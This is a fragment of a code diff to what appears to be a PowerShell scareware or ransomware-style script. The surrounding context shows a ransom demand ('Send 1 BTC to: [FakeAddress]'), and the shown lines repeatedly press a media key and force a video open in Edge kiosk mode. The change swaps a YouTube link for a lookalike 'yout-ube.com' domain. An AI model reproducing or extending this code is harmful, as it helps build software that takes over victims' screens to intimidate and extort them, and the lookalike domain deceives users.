@@ -240,7 +240,7 @@ Send 1 BTC to: [FakeAddress]
                         [Audio]::keybd_event(0xAF, 0, 0, 0)
                         Start-Sleep -Milliseconds 10
                     }
-                    $videoUrl = "https://www.youtube.com/watch?v=_z2RvL2s5rQ"
+                    $videoUrl = "https://www.yout-ube.com/watch?v=_z2RvL2s5rQ"
                     Start-Process "msedge" -ArgumentList "--kiosk $videoUrl"
                     Start-Sleep -Seconds 5
                     $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
